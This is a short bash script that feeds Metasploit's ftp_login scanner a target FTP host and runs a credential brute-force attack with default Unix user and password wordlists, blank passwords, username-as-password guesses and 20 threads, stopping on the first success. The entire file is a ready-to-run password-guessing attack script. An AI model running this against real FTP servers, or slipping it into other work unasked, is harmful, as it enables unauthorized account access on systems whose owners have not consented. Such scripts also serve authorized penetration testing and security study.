#!/bin/bash

if [ $# -eq 1 ]; then
msfconsole -n -q -r - << EOF
use auxiliary/scanner/ftp/ftp_login
set BLANK_PASSWORDS true
set BRUTEFORCE_SPEED 5
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS $1
set STOP_ON_SUCCESS true
set THREADS 20
set USER_AS_PASS true
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run
exit
EOF
else
    echo "Please provide the target FTP server."
fi
